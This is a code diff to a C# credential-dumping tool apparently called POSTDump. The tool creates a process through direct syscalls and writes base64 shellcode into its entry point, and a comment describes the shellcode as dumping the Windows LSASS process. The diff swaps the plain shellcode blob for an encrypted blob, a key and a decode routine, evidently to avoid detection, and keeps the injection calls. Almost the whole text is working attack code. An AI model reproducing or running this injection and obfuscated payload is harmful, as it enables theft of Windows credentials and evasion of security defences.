@@ -96,7 +96,7 @@ namespace POSTDump
 
             var hProcess = IntPtr.Zero;
             var hThread = IntPtr.Zero;
-            
+
             NtCreateUserProcess NTCP = (NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtCreateUserProcess"), typeof(NtCreateUserProcess));
             uint res = NTCP(ref hProcess, ref hThread, 0x001F0FFF, 0x001F0FFF, IntPtr.Zero, IntPtr.Zero, 0, 0x00000001, processParams, ref ci, ref attributeList);
             if (status != 0)
@@ -128,17 +128,19 @@ namespace POSTDump
             // https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/
             // This shellcode is for Windows 10 and Server 2019 x86_64.
             // Tested also on Windows 11 x64.
-            byte[] buf = Convert.FromBase64String("QVNBUEFRQVdRSYP3W0mD8FVJ/8NJg8ApSf/ISYPoLkmD6yZIg/kJSffALQAAAEmDw1tJ98M/AAAASf/ISYPpQ0mD8xRJ/8FJ98MhAAAASYPzF0j3wRYAAABIg/FXSIPpWkiDwTZJg+tFSP/JSIPpVUmD6DhI98FbAAAASf/PSYP4K0n3wU4AAABJ98dAAAAASYPpTkmD8B1I/8FJg/8ySIPxS0mD8FBJ98E5AAAASf/BSYPxOkj3wSMAAABJg/86SYPBF0mD719Jg+s8Sf/AQVtBWEFZQV9Z6RsDAADMzMxIiVwkCEiJdCQQV0iD7BBlSIsEJWAAAACL8UiLUBhMi0oQTYtBME2FwA+EuAAAAEEPEEFYSWNAPE2LCUKLnACIAAAAM9LzD38EJIXbdNRIiwQkSMHoEEQPt9BFhdJ0IEiLTCQIRYvawcoNgDlhD74BfAODwuAD0Ej/wUn/y3XoTY0UGDPJQYt6IEkD+EE5Shh2kIsfRTPbSI1/BEkD2EHByw0PvgNI/8NEA9iAe/8Ade1BjQQTO8Z0Df/BQTtKGHLR6Vz///9Bi0IkA8lJA8APtwQBQYtKHMHgAkiYSQPAiwQBSQPA6wIzwEiLXCQgSIt0JChIg8QQX8PMzMxAVVNWV0FUQVVBVkFXSI2sJCj///9IgezYAQAAM8BIjX2guTABAADzqkUz9rlMdyYHx0WAa2VybsdFhGVsMzLHRYguZGxsRIh1jMdEJHBkYmdjx0QkdG9yZS7HRCR4ZGxsAMdEJGBudGRsx0QkZGwuZGxmx0QkaGwAx0QkUGxzYXPHRCRUcy5kbWbHRCRYcADHRCRAbHNhc8dEJERzLmV4ZsdEJEhlAMaFIAEAAGHoUf7//0iNTYBIi/j/10iNTCRw/9dIjUwkYP/XuYA5HpLoMP7//7na9tpPSIvw6CP+//+5J6noZ0iL+OgW/v//uY1SAb1Ii9joCf7//7l0cY3cTIvg6Pz9//+5tHON4kyL+Ojv/f//ue6VtlBMi+jo4v3//7k918huSImFMAEAAOjR/f//uXoZd2pIiUWQ6MP9//9MjY0oAQAAQY1OFEUzwLIB/9BMIXQkMEiNTCRQRTPJRTPAugAAABDHRCQogAAAAMdEJCACAAAA/9cz0kiJhTgBAACNSgL/1kiNVaDHRaAwAQAASIvISIv4/9Mz24XAdDHrHEiNVaBIi89B/9RIjVXMSI2NIAEAAEH/1USLdahIjVQkQEiNjSABAABB/9eFwHXRRYvGM9K5//8fAP+VMAEAAEyLhTgBAABIiVwkMEiLyEG5AgAAAEGL1kiJXCQoSIlcJCD/VZBIgcTYAQAAQV9BXkFdQVxfXltdw8xWSIv0SIPk8EiD7CDo0/3//0iL5l7D");
+            byte[] buf1 = Convert.FromBase64String("KBsNNgkDAw09POiiMgHPlh0bvZkl9qt8ILeEL8u6bBPvnk0d6rFFL7+Sb1psdSLWqhMFkYttQlpsPJSdIMulJQHRsU4liqocnottZkhSC9mfYiOiqF5MZkgawas7Pei8MwDPp34bwbEpPZScIculMwHRqmIkgqoOaUhML7edC9mUXiKiqAZMZkgbtZ0sdWtVIMulKAHRskckiqoc6rd+LsujCRPvhTscnol1ZkhSC6WtPOikUwC7p2tSQlol9pRvIMuNcQHRrQUl9oBpILeMJxMTGhs1NDQMgFNPZkiejpYk/DdxYQDFEmxCFRLvmXswIcNIQyhSQlrnhCPeOVAA7QJCD9EtRSbQqUfI3khSQhtjZSoNICsMWgXZSxjn6WvdaUhMVZqhTSVoUe6OHZwE7Ux2CpuEZS9a3pgJ45omYhLnOU9dLMOWp4JfwmMNetVUFUvPpKhRkhKTtCKqoj2kK8VGWmmlNOAvSQFPnglrCEIa5eBKLHuXLsUtRhNvrSqUokVD2EsavZkodrPVErdME6UTz15/Tq0hZLeNJ3MYWii9nDeqlrcN7Qp2QZMldqta3kxNJ8MYXpuMdyPNIEuM7UxTC1msnmlmqQDHOmxyCtEYUUMd6oxcOYuejpYsIDgDPgkYJx0TFBs7Peb5TWCzmbcaw7a0dGtVWogE6zXy+2ptdWumww1/kPEeNXxrsi7VAi0+CI8Xxj8ARlmSLMBiAiQ+BtIZ+awRTTgoBC8xhR5IAQQnDGaLImwqJjYAdawRTSgiEiw+hR5IEQd7DSQqoQx2KjZssi9xOSQ/BzuVBn44BkUxBC6LImwKMlqrMU8VBTstFY8WZh4fWw4tD48IQgA3QpzpVWpVaSmkN7atvRLhOOsd4rCzsQDfDn4cirwd5ARoBreF+9pVa/m9WbazmfGItIAjPeClgWuymbfrZfOEEiPekaBamLet+9c+dNYd4pCkb7atveMYBOaJJcOsjrSvvaXVwRjYiwTHnqC9v6WTzIXA3xgA7aC6oKeTitJovoAiLsHXcltsdYOElLez3zJLNTAk/C7FgYuxmbcez9dEdGtVKMUCcg1hguhtirsZSDxoVgDfDn48MFicLHuM3EhSQkqrMU996UhMZo8WZnpudWtVlp9/tADbx2JtdWvYI0qzsADfF/qrMMtlaEhMLsOaCtGUirhmss2MEnm5XhLhIMsd4ocNmZwazw+gPebYSUlMZgmtlx7nAMMd5BxoJgDfz3ptdWsUlp/Jpj2DB9GqRrnslrdTZrfHcltsdSfe7HBNZkgaywZIRSPeoQn1ZEhSQhvnoyPcNWxkLsEOZnqTIPsd6IyUZ0hSAwUtKyoIKBQTOBMPgZY6PeChIcuolgDRrnqEppaqlgDHgBaR");
+            byte[] k = Convert.FromBase64String("aUhMZkhSQlpsdWtV");
+            byte[] buf2 = dec(buf1, k);
 
-            IntPtr RegSize = (IntPtr)buf.Length;
+            IntPtr RegSize = (IntPtr)buf2.Length;
             IntPtr addr = addressOfEntryPoint;
             ISyscall.NtProtectVirtualMemory NTP = (ISyscall.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntprotptr, typeof(ISyscall.NtProtectVirtualMemory));
             NTP(hProcess, ref addressOfEntryPoint, ref RegSize, 0x04, out uint old);
 
-            IntPtr buffer = Marshal.AllocHGlobal(buf.Length);
-            Marshal.Copy(buf, 0, buffer, buf.Length);
+            IntPtr buffer = Marshal.AllocHGlobal(buf2.Length);
+            Marshal.Copy(buf2, 0, buffer, buf2.Length);
             ISyscall.NtWriteVirtualMemory NTW = (ISyscall.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntwriteptr, typeof(ISyscall.NtWriteVirtualMemory));
-            NTW(hProcess, addr, buffer, (uint)buf.Length, out nRead);
+            NTW(hProcess, addr, buffer, (uint)buf2.Length, out nRead);
             if (nRead == 0)
             {
                 Console.WriteLine("Write failed");
@@ -149,7 +151,7 @@ namespace POSTDump
             NtResumeThread NTRT = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtResumeThread"), typeof(NtResumeThread));
             uint s = 0;
             NTRT(hThread, ref s);
-            
+
             return true;
         }
     }
